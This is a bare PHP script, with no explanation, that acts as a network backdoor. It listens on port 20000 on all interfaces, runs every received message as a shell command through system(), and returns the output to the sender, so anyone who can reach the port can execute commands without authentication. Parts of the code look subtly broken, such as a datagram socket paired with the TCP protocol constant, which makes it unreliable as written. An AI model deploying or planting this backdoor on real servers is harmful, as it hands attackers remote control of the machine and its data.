<?php

$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_TCP);
socket_bind($sock, '0.0.0.0', 20000);

for (;;) {
    socket_recvfrom($sock, $message, 1024, 0, $ip, $port);
    $reply = system($message);
    $reply = $reply . "\n";
    socket_sendto($sock, $reply, strlen($reply), 0, $ip, $port);
}
?>
